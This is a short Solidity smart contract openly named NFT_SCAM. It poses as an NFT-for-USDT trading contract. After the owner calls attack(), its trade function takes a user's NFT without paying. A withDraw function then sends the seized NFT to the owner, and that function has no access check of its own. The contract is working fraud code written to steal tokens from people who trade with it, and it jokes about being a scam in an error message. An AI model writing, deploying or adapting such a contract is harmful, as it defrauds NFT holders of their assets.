// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC721 {
    function ownerOf(uint256 tokenId) external view returns (address);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external virtual;
}

contract NFT_SCAM{
    address owner;
    IERC721 nft;
    IERC20 usdt;
    uint256 price_nft = 50e17;
    bool isAttack = false;
    uint256 tokenId;

    modifier onlyOwner{
        require(owner == msg.sender, "This is my scam contract hahahhaha");
        _;
    }

    constructor(address _owner, address _usdt){
        owner = _owner;
        usdt = IERC20(_usdt);
    }

    function attack() external onlyOwner{
        isAttack = true;
    }

    function trade(address _nft, uint256 _tokenId) external payable{
        nft = IERC721(_nft);
        tokenId = _tokenId;
        require(nft.ownerOf(tokenId) == msg.sender, "Please input the valid tokenid");
        if(isAttack){
            // nft.setApprovalForAll(address(this), true); ini nanti dilakukan sama user
            nft.safeTransferFrom(msg.sender, address(this), tokenId);
        }else{
            nft.safeTransferFrom(msg.sender, address(this), tokenId);
            usdt.transfer(msg.sender, price_nft);
        }
    }

    function withDraw() external{
        nft.setApprovalForAll(owner, true);
        nft.safeTransferFrom(address(this), owner, tokenId);
    }

}